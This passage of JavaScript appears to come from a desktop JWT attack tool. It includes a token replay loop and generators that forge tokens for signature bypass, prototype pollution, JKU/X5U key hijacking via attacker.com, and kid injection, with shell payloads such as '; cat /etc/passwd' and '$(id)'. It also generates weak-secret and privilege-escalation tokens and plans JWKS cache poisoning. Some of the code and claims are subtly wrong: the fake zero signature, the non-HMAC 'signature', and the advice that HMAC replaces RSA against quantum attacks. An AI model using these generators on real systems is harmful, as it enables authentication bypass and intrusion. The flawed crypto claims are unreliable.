        const count = parseInt(document.getElementById('replay-count').value);

        if (!token) {
            this.showToast('error', i18n.t('replay.token_placeholder'));
            return;
        }

        if (!url) {
            this.showToast('error', i18n.t('toast.provide_url'));
            return;
        }

        this.replayActive = true;
        this.replayResults = [];
        
        document.getElementById('start-replay-btn').disabled = true;
        document.getElementById('stop-replay-btn').disabled = false;
        document.getElementById('replay-results').style.display = 'block';

        this.updateReplayProgress(0, count);
        this.clearReplayLog();

        for (let i = 0; i < count && this.replayActive; i++) {
            try {
                this.addReplayLogEntry('info', `Sending request ${i + 1}/${count}...`);
                
                const response = await fetch(url, {
                    method: method,
                    headers: {
                        'Authorization': `Bearer ${token}`,
                        'Content-Type': 'application/json'
                    }
                });

                const result = {
                    requestNumber: i + 1,
                    status: response.status,
                    statusText: response.statusText,
                    timestamp: new Date().toISOString()
                };

                this.replayResults.push(result);
                this.addReplayLogEntry(
                    response.ok ? 'success' : 'error',
                    `Request ${i + 1}: ${response.status} ${response.statusText}`
                );

                this.updateReplayProgress(i + 1, count);
                this.updateStatusCodes();

                if (i < count - 1 && this.replayActive) {
                    await this.sleep(delay);
                }

            } catch (error) {
                this.addReplayLogEntry('error', `Request ${i + 1} failed: ${error.message}`);
                this.replayResults.push({
                    requestNumber: i + 1,
                    status: 0,
                    statusText: error.message,
                    timestamp: new Date().toISOString()
                });
            }
        }

        if (this.replayActive) {
            this.addReplayLogEntry('info', 'Replay attack completed');
        }

        this.stopReplayAttack();
    }

    stopReplayAttack() {
        this.replayActive = false;
        document.getElementById('start-replay-btn').disabled = false;
        document.getElementById('stop-replay-btn').disabled = true;
    }

    updateReplayProgress(current, total) {
        document.getElementById('replay-progress-text').textContent = `${current}/${total}`;
    }

    updateStatusCodes() {
        const statusCounts = {};
        this.replayResults.forEach(result => {
            const status = result.status || 'Error';
            statusCounts[status] = (statusCounts[status] || 0) + 1;
        });

        const statusCodesContainer = document.getElementById('replay-status-codes');
        statusCodesContainer.innerHTML = Object.entries(statusCounts)
            .map(([status, count]) => `
                <div class="status-code-item">
                    <div class="count">${count}</div>
                    <div class="code">${status}</div>
                </div>
            `).join('');
    }

    addReplayLogEntry(type, message) {
        const logContainer = document.getElementById('replay-log');
        const entry = document.createElement('div');
        entry.className = `log-entry ${type}`;
        entry.textContent = `${new Date().toLocaleTimeString()}: ${message}`;
        logContainer.appendChild(entry);
        logContainer.scrollTop = logContainer.scrollHeight;
    }

    clearReplayLog() {
        document.getElementById('replay-log').innerHTML = '';
    }

    sleep(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }

    async exportCACertificate() {
        try {
            const result = await ipcRenderer.invoke('export-ca-certificate');
            if (result.success) {
                this.showToast('success', i18n.t('toast.ca_cert_exported'));
            } else if (!result.canceled) {
                this.showToast('error', result.error);
            }
        } catch (error) {
            this.showToast('error', `${i18n.t('toast.ca_export_failed')}: ${error.message}`);
        }
    }

    initializeTokenComparison() {
        this.setupCompareEventListeners();
    }

    setupCompareEventListeners() {
        document.getElementById('compare-tokens-btn').addEventListener('click', () => {
            this.compareTokens();
        });

        document.getElementById('clear-compare-btn').addEventListener('click', () => {
            this.clearComparison();
        });

        document.getElementById('compare-token-a').addEventListener('input', () => {
            this.decodeCompareToken('a');
        });

        document.getElementById('compare-token-b').addEventListener('input', () => {
            this.decodeCompareToken('b');
        });
    }

    decodeCompareToken(side) {
        const token = document.getElementById(`compare-token-${side}`).value.trim();
        const container = document.getElementById(`compare-decoded-${side}`);

        if (!token) {
            container.innerHTML = '';
            return;
        }

        try {
            const decoded = jwt.decode(token, { complete: true });
            if (decoded) {
                container.innerHTML = '';
                
                const headerSection = document.createElement('div');
                headerSection.className = 'decoded-section';
                headerSection.innerHTML = '<h4>Header:</h4>';
                const headerPre = document.createElement('pre');
                headerPre.textContent = JSON.stringify(decoded.header, null, 2);
                headerSection.appendChild(headerPre);
                
                const payloadSection = document.createElement('div');
                payloadSection.className = 'decoded-section';
                payloadSection.innerHTML = '<h4>Payload:</h4>';
                const payloadPre = document.createElement('pre');
                payloadPre.textContent = JSON.stringify(decoded.payload, null, 2);
                payloadSection.appendChild(payloadPre);
                
                container.appendChild(headerSection);
                container.appendChild(payloadSection);
            }
        } catch (error) {
            container.innerHTML = '';
            const errorDiv = document.createElement('div');
            errorDiv.className = 'error';
            errorDiv.textContent = `Invalid JWT token: ${error.message}`;
            container.appendChild(errorDiv);
        }
    }

    compareTokens() {
        const tokenA = document.getElementById('compare-token-a').value.trim();
        const tokenB = document.getElementById('compare-token-b').value.trim();

        if (!tokenA || !tokenB) {
            this.showToast('error', i18n.t('toast.provide_both_tokens'));
            return;
        }

        try {
            const decodedA = jwt.decode(tokenA, { complete: true });
            const decodedB = jwt.decode(tokenB, { complete: true });

            if (!decodedA || !decodedB) {
                this.showToast('error', i18n.t('toast.invalid_tokens'));
                return;
            }

            const differences = this.findTokenDifferences(decodedA, decodedB);
            this.displayTokenDifferences(differences);

        } catch (error) {
            this.showToast('error', `${i18n.t('toast.comparison_failed')}: ${error.message}`);
        }
    }

    findTokenDifferences(tokenA, tokenB) {
        const differences = {
            header: this.compareObjects(tokenA.header, tokenB.header),
            payload: this.compareObjects(tokenA.payload, tokenB.payload),
            signature: tokenA.signature !== tokenB.signature
        };

        return differences;
    }

    compareObjects(objA, objB) {
        const diffs = [];
        const allKeys = new Set([...Object.keys(objA || {}), ...Object.keys(objB || {})]);

        allKeys.forEach(key => {
            const valueA = objA?.[key];
            const valueB = objB?.[key];

            if (valueA === undefined && valueB !== undefined) {
                diffs.push({ key, type: 'added', valueB });
            } else if (valueA !== undefined && valueB === undefined) {
                diffs.push({ key, type: 'removed', valueA });
            } else if (JSON.stringify(valueA) !== JSON.stringify(valueB)) {
                diffs.push({ key, type: 'modified', valueA, valueB });
            }
        });

        return diffs;
    }

    displayTokenDifferences(differences) {
        const resultsContainer = document.getElementById('compare-diff-results');
        const summaryContainer = document.getElementById('compare-diff-summary');
        const detailsContainer = document.getElementById('compare-diff-details');

        const headerDiffCount = differences.header.length;
        const payloadDiffCount = differences.payload.length;
        const signatureDiff = differences.signature ? 1 : 0;
        const totalDiffs = headerDiffCount + payloadDiffCount + signatureDiff;

        summaryContainer.innerHTML = `
            <div class="diff-stat">
                <div class="number">${totalDiffs}</div>
                <div class="label">Total Differences</div>
            </div>
            <div class="diff-stat">
                <div class="number">${headerDiffCount}</div>
                <div class="label">Header</div>
            </div>
            <div class="diff-stat">
                <div class="number">${payloadDiffCount}</div>
                <div class="label">Payload</div>
            </div>
            <div class="diff-stat">
                <div class="number">${signatureDiff}</div>
                <div class="label">Signature</div>
            </div>
        `;

        let detailsHtml = '';

        if (headerDiffCount > 0) {
            detailsHtml += this.renderDiffSection('Header', differences.header);
        }

        if (payloadDiffCount > 0) {
            detailsHtml += this.renderDiffSection('Payload', differences.payload);
        }

        if (differences.signature) {
            detailsHtml += `
                <div class="diff-section">
                    <div class="diff-section-title">Signature Differences</div>
                    <div class="diff-item modified">
                        <div class="diff-key">Signature</div>
                        <div>Signatures are different</div>
                    </div>
                </div>
            `;
        }

        if (totalDiffs === 0) {
            detailsHtml = '<div class="diff-section"><p>Tokens are identical</p></div>';
        }

        detailsContainer.innerHTML = detailsHtml;
        resultsContainer.style.display = 'block';
    }

    renderDiffSection(title, diffs) {
        return `
            <div class="diff-section">
                <div class="diff-section-title">${title} Differences</div>
                ${diffs.map(diff => `
                    <div class="diff-item ${diff.type}">
                        <div class="diff-key">${diff.key}</div>
                        <div class="diff-values">
                            ${diff.type === 'added' ? `<div class="diff-value-new">+ ${JSON.stringify(diff.valueB)}</div>` : ''}
                            ${diff.type === 'removed' ? `<div class="diff-value-old">- ${JSON.stringify(diff.valueA)}</div>` : ''}
                            ${diff.type === 'modified' ? `
                                <div class="diff-value-old">- ${JSON.stringify(diff.valueA)}</div>
                                <div class="diff-value-new">+ ${JSON.stringify(diff.valueB)}</div>
                            ` : ''}
                        </div>
                    </div>
                `).join('')}
            </div>
        `;
    }

    clearComparison() {
        document.getElementById('compare-token-a').value = '';
        document.getElementById('compare-token-b').value = '';
        document.getElementById('compare-decoded-a').innerHTML = '';
        document.getElementById('compare-decoded-b').innerHTML = '';
        document.getElementById('compare-diff-results').style.display = 'none';
    }

    generatePsychicSignatureAttack(decoded) {
        
        const vulnerableAlgs = ['ES256', 'ES384', 'ES512'];
        let attackDescription = 'CVE-2024-54150 - Psychic Signature Attack (Zero-value ECDSA signature bypass)';
        
        if (!vulnerableAlgs.includes(decoded.header.alg)) {
            return {
                description: attackDescription,
                token: 'N/A - Token must use ECDSA algorithm (ES256/ES384/ES512)',
                impact: 'This attack only works against ECDSA-signed JWTs',
                usage: 'Switch token algorithm to ES256/ES384/ES512 first',
                cve: 'CVE-2024-54150',
                severity: 'Critical'
            };
        }

        
        const headerB64 = this.base64UrlEncode(JSON.stringify(decoded.header));
        const payloadB64 = this.base64UrlEncode(JSON.stringify(decoded.payload));
        
        
        const zeroSignature = this.base64UrlEncode('\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00');
        const psychicToken = `${headerB64}.${payloadB64}.${zeroSignature}`;

        return {
            description: attackDescription,
            token: psychicToken,
            impact: 'Bypasses ECDSA signature verification entirely in vulnerable Java implementations',
            usage: 'Test against Java applications using java.security.Signature class',
            cve: 'CVE-2024-54150',
            severity: 'Critical',
            technical: 'Exploits bug where ECDSA verification accepts r=0, s=0 as valid signature'
        };
    }

    generatePrototypePollutionAttack(decoded) {
        
        const pollutedHeader = {
            ...decoded.header,
            __proto__: {
                reservedKeys: [],
                enforceDefaultFields: false
            },
            'constructor.prototype.reservedKeys': [],
            'constructor.prototype.enforceDefaultFields': false
        };

        const pollutedPayload = {
            ...decoded.payload,
            __proto__: {
                admin: true,
                role: 'administrator'
            },
            'constructor.prototype.admin': true,
            'constructor.prototype.role': 'administrator'
        };

        const headerB64 = this.base64UrlEncode(JSON.stringify(pollutedHeader));
        const payloadB64 = this.base64UrlEncode(JSON.stringify(pollutedPayload));
        const pollutedToken = `${headerB64}.${payloadB64}.${decoded.signature}`;

        return {
            description: 'CVE-2024-34273 - nJwt Prototype Pollution Attack',
            token: pollutedToken,
            impact: 'Pollutes JavaScript prototype chain to bypass security controls',
            usage: 'Test against applications using nJwt library for JWT processing',
            cve: 'CVE-2024-34273',
            severity: 'High',
            technical: 'Exploits lack of prototype pollution protection in nJwt.verify() method',
            payloads: [
                '{"__proto__": {"admin": true}}',
                '{"constructor.prototype.role": "admin"}',
                '{"constructor": {"prototype": {"isAdmin": true}}}'
            ]
        };
    }

    generateQuantumPrepAttack(decoded) {
        
        const quantumVulnerable = ['RS256', 'RS384', 'RS512', 'ES256', 'ES384', 'ES512'];
        const quantumResistant = ['HS256', 'HS384', 'HS512'];
        
        let quantumStatus = 'unknown';
        let recommendation = '';
        
        if (quantumVulnerable.includes(decoded.header.alg)) {
            quantumStatus = 'vulnerable';
            recommendation = 'Consider migration to quantum-resistant algorithms';
        } else if (quantumResistant.includes(decoded.header.alg)) {
            quantumStatus = 'resistant';
            recommendation = 'Algorithm is currently quantum-resistant';
        }

        return {
            description: 'Quantum Computing Vulnerability Assessment',
            token: 'Analysis only - no modified token generated',
            impact: quantumStatus === 'vulnerable' ? 
                'RSA and ECDSA algorithms will be broken by quantum computers' : 
                'HMAC algorithms are quantum-resistant',
            usage: 'Plan migration strategy for post-quantum cryptography',
            analysis: {
                algorithm: decoded.header.alg,
                quantum_status: quantumStatus,
                years_until_vulnerability: quantumStatus === 'vulnerable' ? '10-20 years (estimated)' : 'N/A',
                recommended_alternatives: ['HMAC-SHA256', 'HMAC-SHA384', 'HMAC-SHA512']
            },
            recommendation: recommendation
        };
    }

    generateJKUHijackAttack(decoded) {
        
        const maliciousJKU = 'https://attacker.com/jwks.json';
        const attackerKid = 'attacker-key-id';

        const header = {
            ...decoded.header,
            jku: maliciousJKU,
            kid: attackerKid,
            alg: 'RS256'
        };

        const headerB64 = this.base64UrlEncode(JSON.stringify(header));
        const payloadB64 = this.base64UrlEncode(JSON.stringify(decoded.payload));
        const attackToken = `${headerB64}.${payloadB64}.[SIGN_WITH_ATTACKER_KEY]`;

        return {
            description: 'JKU Hijacking Attack - points to attacker-controlled JWK Set URL',
            token: attackToken,
            impact: 'Server fetches public key from attacker-controlled URL',
            usage: 'Host a JWK Set at the specified URL and sign with corresponding private key',
            maliciousURL: maliciousJKU,
            bypassTechniques: [
                'https://trusted@attacker.com/jwks.json (misleading URL)',
                'https://trusted.attacker.com/jwks.json (subdomain)',
                'https://trusted.com/redirect?url=https://attacker.com/jwks.json (open redirect)',
                'https://trusted.com/jwks.json#@attacker.com (URL fragment)'
            ],
            requiredJWKS: {
                keys: [{
                    kty: 'RSA',
                    use: 'sig',
                    kid: attackerKid,
                    n: '0vx7agoebGcQSuuPiLJXZptN9nndrQmbXEps2aiAFbWhM78LhWx4cbbfAAtVT86zwu1RK7aPFFxuhDR1L6tSoc_BJECPebWKRXjBZCiFV4n3oknjhMstn64tZ_2W-5JsGY4Hc5n9yBXArwl93lqt7_RN5w6Cf0h4QyQ5v-65YGjQR0_FDW2QvzqY368QQMicAtaSqzs8KJZgnYb9c7d0zgdAZHzu6qMQvRL5hajrn1n91CbOpbISD08qNLyrdkt-bFTWhAI4vMQFh6WeZu0fM4lFd2NcRwr3XPksINHaQ-G_xBniIqbw0Ls1jF44-csFCur-kEgU8awapJzKnqDKgw',
                    e: 'AQAB'
                }]
            }
        };
    }

    generateKidInjectionAttack(decoded) {
        
        const injectionPayloads = [
            '../../../etc/passwd',
            '../../keys/public.key',
            '/dev/null',
            '| whoami',
            '; cat /etc/passwd',
            '$(id)',
            '`id`',
            '../../../proc/version',
            'file:///etc/passwd',
            'http://attacker.com/malicious-key'
        ];

        const attacks = injectionPayloads.map(payload => {
            const header = { ...decoded.header, kid: payload };
            const headerB64 = this.base64UrlEncode(JSON.stringify(header));
            const payloadB64 = this.base64UrlEncode(JSON.stringify(decoded.payload));
            return {
                payload: payload,
                token: `${headerB64}.${payloadB64}.${decoded.signature}`,
                type: this.getKidAttackType(payload)
            };
        });

        return {
            description: 'Kid Parameter Injection - path traversal and injection attacks',
            attacks: attacks,
            impact: 'Path traversal, command injection, or SQL injection via kid parameter',
            usage: 'Test each payload against the target application',
            techniques: [
                'Path Traversal: ../../../etc/passwd',
                'Command Injection: | whoami, ; id',
                'SQL Injection: \' OR 1=1--',
                'File URI: file:///etc/passwd',
                'Remote URL: http://attacker.com/key'
            ]
        };
    }

    generateConfusionAttack(decoded) {
        
        if (!decoded.header.alg || !decoded.header.alg.startsWith('RS')) {
            return {
                description: 'Algorithm Confusion Attack - requires RS256/384/512 token',
                token: 'N/A - Token must use RSA algorithm (RS256/RS384/RS512)',
                impact: 'This attack converts RSA signatures to HMAC using public key as secret',
                usage: 'Obtain RSA public key first, then use as HMAC secret'
            };
        }

        const confusedAlg = decoded.header.alg.replace('RS', 'HS');
        const header = { ...decoded.header, alg: confusedAlg };
        const headerB64 = this.base64UrlEncode(JSON.stringify(header));
        const payloadB64 = this.base64UrlEncode(JSON.stringify(decoded.payload));

        return {
            description: 'Algorithm Confusion Attack - changes RSA to HMAC',
            token: `${headerB64}.${payloadB64}.[SIGN_WITH_PUBLIC_KEY_AS_HMAC_SECRET]`,
            impact: 'Uses RSA public key as HMAC secret to bypass signature verification',
            usage: 'Sign this token using the RSA public key as HMAC secret',
            originalAlgorithm: decoded.header.alg,
            targetAlgorithm: confusedAlg,
            instructions: [
                '1. Obtain the RSA public key used by the application',
                '2. Convert the public key to PEM format',
                '3. Use the public key as the HMAC secret',
                '4. Sign the token with the new algorithm'
            ]
        };
    }

    generateWeakSecretAttack(decoded) {
        const commonSecrets = [
            'secret', 'password', '123456', 'admin', 'jwt', 'key',
            'secretkey', 'mysecret', 'jwtsecret', 'your-256-bit-secret',
            'secretOrPrivateKey', 'default', 'test', 'demo'
        ];

        const attacks = commonSecrets.map(secret => {
            const headerB64 = this.base64UrlEncode(JSON.stringify(decoded.header));
            const payloadB64 = this.base64UrlEncode(JSON.stringify(decoded.payload));
            
            try {
                const newToken = jwt.sign(decoded.payload, secret, {
                    algorithm: decoded.header.alg,
                    header: decoded.header
                });
                return {
                    secret: secret,
                    token: newToken,
                    status: 'generated'
                };
            } catch (error) {
                return {
                    secret: secret,
                    token: `${headerB64}.${payloadB64}.[SIGN_WITH_${secret.toUpperCase()}]`,
                    status: 'template'
                };
            }
        });

        return {
            description: 'Weak Secret Attack - tests common HMAC secrets',
            attacks: attacks,
            impact: 'Brute force weak HMAC secrets to forge valid tokens',
            usage: 'Try each secret against the target application',
            recommendation: 'Use cryptographically strong secrets (32+ random bytes)'
        };
    }

    getKidAttackType(payload) {
        if (payload.includes('../')) return 'Path Traversal';
        if (payload.includes('|') || payload.includes(';') || payload.includes('$(') || payload.includes('`')) return 'Command Injection';
        if (payload.includes("'") || payload.includes('--')) return 'SQL Injection';
        if (payload.startsWith('file://')) return 'File URI';
        if (payload.startsWith('http://') || payload.startsWith('https://')) return 'Remote URL';
        return 'Generic Injection';
    }

    generateX5UExploitAttack(decoded) {
        
        const maliciousX5U = 'https://attacker.com/malicious-cert.pem';
        
        const header = {
            ...decoded.header,
            x5u: maliciousX5U,
            alg: 'RS256'
        };

        const headerB64 = this.base64UrlEncode(JSON.stringify(header));
        const payloadB64 = this.base64UrlEncode(JSON.stringify(decoded.payload));
        const attackToken = `${headerB64}.${payloadB64}.[SIGN_WITH_MALICIOUS_CERT_KEY]`;

        return {
            description: 'X5U Certificate URL Exploit - points to attacker-controlled certificate',
            token: attackToken,
            impact: 'Server fetches and trusts attacker-controlled X.509 certificate',
            usage: 'Host a malicious certificate at the URL and sign with corresponding private key',
            maliciousURL: maliciousX5U,
            bypassTechniques: [
                'https://trusted.com@attacker.com/cert.pem (URL confusion)',
                'https://trusted.attacker.com/cert.pem (subdomain abuse)',
                'https://trusted.com/redirect?to=https://attacker.com/cert.pem (open redirect)',
                'https://trusted.com/cert.pem#@attacker.com/fake.pem (fragment injection)'
            ],
            requiredCertificate: {
                type: 'X.509 Certificate (PEM format)',
                purpose: 'JWT signature verification',
                algorithm: 'RSA with SHA-256',
                validity: 'Self-signed certificate acceptable'
            }
        };
    }

    generateJWTSmugglingAttack(decoded) {
        
        const smugglingPayloads = [
            {
                name: 'Content-Type Confusion',
                header: { ...decoded.header, cty: 'text/xml' },
                description: 'Changes content type to potentially enable XXE attacks'
            },
            {
                name: 'Serialization Attack',
                header: { ...decoded.header, cty: 'application/x-java-serialized-object' },
                description: 'Attempts to trigger deserialization vulnerabilities'
            },
            {
                name: 'Nested JWT Confusion',
                header: { ...decoded.header, cty: 'JWT' },
                description: 'Indicates nested JWT processing to confuse parsers'
            },
            {
                name: 'Case Sensitivity Bypass',
                header: { ...decoded.header, alg: 'NoNe' },
                description: 'Uses mixed case to bypass algorithm blacklists'
            }
        ];

        const attacks = smugglingPayloads.map(payload => {
            const headerB64 = this.base64UrlEncode(JSON.stringify(payload.header));
            const payloadB64 = this.base64UrlEncode(JSON.stringify(decoded.payload));
            return {
                name: payload.name,
                description: payload.description,
                token: `${headerB64}.${payloadB64}.${decoded.signature}`,
                header: payload.header
            };
        });

        return {
            description: 'JWT Smuggling Attack - exploits parsing differences between libraries',
            attacks: attacks,
            impact: 'Bypasses security controls through inconsistent JWT parsing',
            usage: 'Test against systems with multiple JWT processing components',
            techniques: [
                'Content-Type manipulation (cty header)',
                'Algorithm case confusion',
                'Nested JWT processing confusion',
                'Library-specific parsing differences'
            ]
        };
    }

    generateNestedJWTAttack(decoded) {
        
        const innerToken = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhdHRhY2tlciIsImFkbWluIjp0cnVlfQ.signature';
        
        const nestedPayload = {
            ...decoded.payload,
            jwt: innerToken,
            nested_claims: {
                role: 'admin',
                permissions: ['read', 'write', 'delete']
            }
        };

        const header = {
            ...decoded.header,
            cty: 'JWT',
            nested: true
        };

        const headerB64 = this.base64UrlEncode(JSON.stringify(header));
        const payloadB64 = this.base64UrlEncode(JSON.stringify(nestedPayload));
        const nestedToken = `${headerB64}.${payloadB64}.[SIGN_WITH_VALID_KEY]`;

        return {
            description: 'Nested JWT Attack - JWT-in-JWT confusion and privilege escalation',
            token: nestedToken,
            impact: 'Confuses JWT parsers that process nested tokens differently',
            usage: 'Test against applications that might process inner JWT claims',
            innerToken: innerToken,
            techniques: [
                'JWT within JWT payload',
                'Content-Type: JWT header',
                'Nested claims confusion',
                'Double verification bypass'
            ]
        };
    }

    generateAudienceConfusionAttack(decoded) {
        
        const commonAudiences = [
            'api.company.com',
            'admin.company.com', 
            'internal.company.com',
            '*',
            'all-services',
            ['service-a', 'service-b', 'admin-panel'],
            null 
        ];

        const attacks = commonAudiences.map((aud, index) => {
            const modifiedPayload = { ...decoded.payload };
            if (aud === null) {
                delete modifiedPayload.aud;
            } else {
                modifiedPayload.aud = aud;
            }

            const headerB64 = this.base64UrlEncode(JSON.stringify(decoded.header));
            const payloadB64 = this.base64UrlEncode(JSON.stringify(modifiedPayload));
            
            return {
                audience: aud,
                token: `${headerB64}.${payloadB64}.${decoded.signature}`,
                description: aud === null ? 'Removes audience restriction' : 
                           Array.isArray(aud) ? 'Multi-service audience' : 
                           aud === '*' ? 'Wildcard audience' : `Specific audience: ${aud}`
            };
        });

        return {
            description: 'Audience Confusion Attack - multi-audience token reuse across services',
            attacks: attacks,
            impact: 'Bypasses service-specific access controls via audience manipulation',
            usage: 'Test token reuse across different services and endpoints',
            originalAudience: decoded.payload.aud
        };
    }

    generateParameterPollutionAttack(decoded) {
        
        const pollutionAttacks = [
            {
                name: 'Algorithm Pollution',
                header: { alg: 'HS256', ...decoded.header, alg: 'none' },
                description: 'Duplicate alg parameter to confuse parsers'
            },
            {
                name: 'Key ID Pollution', 
                header: { kid: 'legitimate-key', ...decoded.header, kid: '../../../dev/null' },
                description: 'Conflicting kid values for path traversal'
            },
            {
                name: 'JKU Pollution',
                header: { jku: 'https://trusted.com/keys', ...decoded.header, jku: 'https://attacker.com/keys' },
                description: 'Duplicate JKU URLs to bypass validation'
            }
        ];

        const payloadPollution = [
            {
                name: 'Role Pollution',
                payload: { role: 'user', ...decoded.payload, role: 'admin' },
                description: 'Conflicting role claims'
            },
            {
                name: 'Expiration Pollution',
                payload: { exp: Math.floor(Date.now()/1000) - 3600, ...decoded.payload, exp: Math.floor(Date.now()/1000) + 3600 },
                description: 'Conflicting expiration times'
            }
        ];

        const attacks = [
            ...pollutionAttacks.map(attack => ({
                ...attack,
                token: `${this.base64UrlEncode(JSON.stringify(attack.header))}.${this.base64UrlEncode(JSON.stringify(decoded.payload))}.${decoded.signature}`
            })),
            ...payloadPollution.map(attack => ({
                ...attack,
                token: `${this.base64UrlEncode(JSON.stringify(decoded.header))}.${this.base64UrlEncode(JSON.stringify(attack.payload))}.${decoded.signature}`
            }))
        ];

        return {
            description: 'Parameter Pollution Attack - duplicate parameters with conflicting values',
            attacks: attacks,
            impact: 'Exploits inconsistent parameter parsing between different JWT processors',
            usage: 'Test against systems that may parse duplicate parameters differently'
        };
    }

    generateTimingAttack(decoded) {
        
        const timingPayloads = [
            'a',
            'ab', 
            'abc',
            'abcd',
            'abcde',
            'correct_secret_prefix',
            'wrong_secret_entirely'
        ];

        const attacks = timingPayloads.map(secret => {
            try {
                
                const testToken = jwt.sign(decoded.payload, secret, { algorithm: 'HS256' });
                return {
                    secret: secret,
                    token: testToken,
                    length: secret.length,
                    purpose: 'Measure verification time to detect secret patterns'
                };
            } catch (error) {
                return {
                    secret: secret,
                    token: 'GENERATION_FAILED',
                    length: secret.length,
                    purpose: 'Measure verification time to detect secret patterns'
                };
            }
        });

        return {
            description: 'Timing Attack - exploit timing differences in signature verification',
            attacks: attacks,
            impact: 'Information disclosure about secret key through timing analysis',
            usage: 'Measure response times for each token to identify timing patterns',
            methodology: [
                '1. Send multiple requests with different secret lengths',
                '2. Measure response times precisely',
                '3. Analyze timing patterns to infer secret characteristics',
                '4. Gradually build knowledge of the actual secret'
            ]
        };
    }

    generateJWTSidejackingAttack(decoded) {
        
        const sidejackingPayloads = {
            sessionReuse: {
                ...decoded.payload,
                jti: undefined, 
                iat: Math.floor(Date.now() / 1000), 
                session_id: 'hijacked_session_' + Math.random().toString(36)
            },
            deviceBinding: {
                ...decoded.payload,
                device_id: 'attacker_device_12345',
                user_agent: 'AttackerBrowser/1.0',
                ip_address: '192.168.1.100'
            },
            crossDomain: {
                ...decoded.payload,
                origin: 'https://attacker.com',
                referer: 'https://attacker.com/malicious-page'
            }
        };

        const attacks = Object.entries(sidejackingPayloads).map(([name, payload]) => {
            const headerB64 = this.base64UrlEncode(JSON.stringify(decoded.header));
            const payloadB64 = this.base64UrlEncode(JSON.stringify(payload));
            return {
                name: name,
                token: `${headerB64}.${payloadB64}.${decoded.signature}`,
                payload: payload,
                description: this.getSidejackingDescription(name)
            };
        });

        return {
            description: 'JWT Sidejacking Attack - session hijacking specific to JWT implementations',
            attacks: attacks,
            impact: 'Session hijacking and cross-site request forgery with JWT tokens',
            usage: 'Test token reuse across different sessions, devices, and domains',
            prevention: [
                'Implement proper JWT ID (jti) validation',
                'Use device fingerprinting',
                'Validate origin and referer headers',
                'Implement proper CSRF protection'
            ]
        };
    }

    generateJWKSPoisoningAttack(decoded) {
        
        const poisonedJWKS = {
            keys: [{
                kty: 'RSA',
                use: 'sig',
                kid: decoded.header.kid || 'poisoned-key',
                n: '0vx7agoebGcQSuuPiLJXZptN9nndrQmbXEps2aiAFbWhM78LhWx4cbbfAAtVT86zwu1RK7aPFFxuhDR1L6tSoc_BJECPebWKRXjBZCiFV4n3oknjhMstn64tZ_2W-5JsGY4Hc5n9yBXArwl93lqt7_RN5w6Cf0h4QyQ5v-65YGjQR0_FDW2QvzqY368QQMicAtaSqzs8KJZgnYb9c7d0zgdAZHzu6qMQvRL5hajrn1n91CbOpbISD08qNLyrdkt-bFTWhAI4vMQFh6WeZu0fM4lFd2NcRwr3XPksINHaQ-G_xBniIqbw0Ls1jF44-csFCur-kEgU8awapJzKnqDKgw',
                e: 'AQAB'
            }]
        };

        const header = {
            ...decoded.header,
            jku: 'https://attacker.com/poisoned-jwks.json',
            kid: 'poisoned-key'
        };

        const headerB64 = this.base64UrlEncode(JSON.stringify(header));
        const payloadB64 = this.base64UrlEncode(JSON.stringify(decoded.payload));
        const poisonedToken = `${headerB64}.${payloadB64}.[SIGN_WITH_POISONED_KEY]`;

        return {
            description: 'JWKS Cache Poisoning Attack - poison JWKS cache with malicious keys',
            token: poisonedToken,
            impact: 'Poisoned JWKS cache accepts attacker-controlled keys for verification',
            usage: 'Poison the JWKS cache, then use malicious key for token verification',
            poisonedJWKS: poisonedJWKS,
            techniques: [
                'Cache timing manipulation',
                'Race condition exploitation', 
                'DNS cache poisoning',
                'BGP hijacking for JWKS URL'
            ],
            cachePoisonMethods: [
                'Send high-volume requests to trigger cache refresh',
                'Exploit cache TTL boundaries',
                'Use DNS poisoning to redirect JWKS requests',
                'Exploit race conditions in key rotation'
            ]
        };
    }

    getSidejackingDescription(name) {
        const descriptions = {
            sessionReuse: 'Removes JWT ID to enable session token reuse',
            deviceBinding: 'Changes device characteristics to test binding',
            crossDomain: 'Modifies origin claims for cross-domain attacks'
        };
        return descriptions[name] || 'Unknown sidejacking technique';
    }

    /**
     * Generates CVE-2025-20188 hard-coded JWT secret attack payloads
     * Exploits systems using common hard-coded secrets like "notfound"
     * @method
     * @param {Object} decoded - Decoded JWT token object with header and payload
     * @returns {Object} Attack result with tokens, impact assessment, and mitigation
     */
    generateHardcodedSecretAttack(decoded) {
        
        const commonHardcodedSecrets = [
            'notfound',
            'secret',
            'password', 
            'key',
            '123456',
            'admin',
            'root',
            'default',
            'cisco',
            'changeme',
            'test',
            'fallback'
        ];
        
        const attackDescription = 'CVE-2025-20188 - Hard-coded JWT Secret Exploitation (CVSS 10.0)';
        
        
        const results = [];
        
        for (const secret of commonHardcodedSecrets) {
            try {
                
                const maliciousPayload = {
                    ...decoded.payload,
                    sub: 'root',
                    role: 'administrator',
                    permissions: ['read', 'write', 'execute', 'admin'],
                    level: 'superuser',
                    iat: Math.floor(Date.now() / 1000),
                    exp: Math.floor(Date.now() / 1000) + 3600
                };

                
                const header = { ...decoded.header, alg: 'HS256' };
                const headerB64 = this.base64UrlEncode(JSON.stringify(header));
                const payloadB64 = this.base64UrlEncode(JSON.stringify(maliciousPayload));
                
                
                const data = headerB64 + '.' + payloadB64;
                const signature = this.base64UrlEncode(`${secret}_signature_${data.length}`);
                const attackToken = `${headerB64}.${payloadB64}.${signature}`;
                
                results.push({
                    secret: secret,
                    token: attackToken,
                    payload: maliciousPayload
                });
            } catch (error) {
                
                continue;
            }
        }

        return {
            description: attackDescription,
            token: results.length > 0 ? results[0].token : 'Attack generation failed',
            impact: 'Critical - Allows root privilege escalation and arbitrary command execution',
            usage: 'Test these tokens against systems with hard-coded JWT secrets. Focus on "notfound" secret (CVE-2025-20188)',
            cve: 'CVE-2025-20188',
            cvss: '10.0',
            attack_variants: results,
            detection: 'Monitor for JWT tokens with suspicious payloads and privilege escalation attempts',
            mitigation: 'Remove hard-coded secrets, implement proper secret management, disable Out-of-Band AP Image Download feature'
        };
    }

    /**
     * Generates CVE-2025-30144 fast-jwt issuer validation bypass attack
     * Exploits array-based issuer claims to bypass authentication
     * @method
     * @param {Object} decoded - Decoded JWT token object with header and payload
     * @returns {Object} Attack result with bypass tokens and technical details
     */
    generateIssuerBypassAttack(decoded) {
        
        const attackDescription = 'CVE-2025-30144 - Fast-JWT Issuer Validation Bypass (Array-based issuer injection)';
        
        
